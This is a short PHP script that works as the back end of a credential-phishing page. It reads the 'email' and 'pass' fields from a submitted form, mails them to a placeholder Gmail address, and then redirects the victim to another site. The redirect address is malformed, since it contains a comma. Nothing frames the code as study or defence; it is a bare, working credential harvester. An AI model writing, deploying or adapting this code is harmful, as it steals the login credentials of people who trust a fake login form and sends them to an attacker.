<?php

$to      = 'xx@gmail.com';
$subject = 'the subject';
$message = $_POST["email"] . "  :  " . $_POST["pass"];
$headers = 'From: xx@gmail.com' . "\r\n" .
    'Reply-To: xx@gmail.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

mail($to, $subject, $message, $headers);


$newURL = "http://www.baby,s.com";
header('Location: '.$newURL);
?>
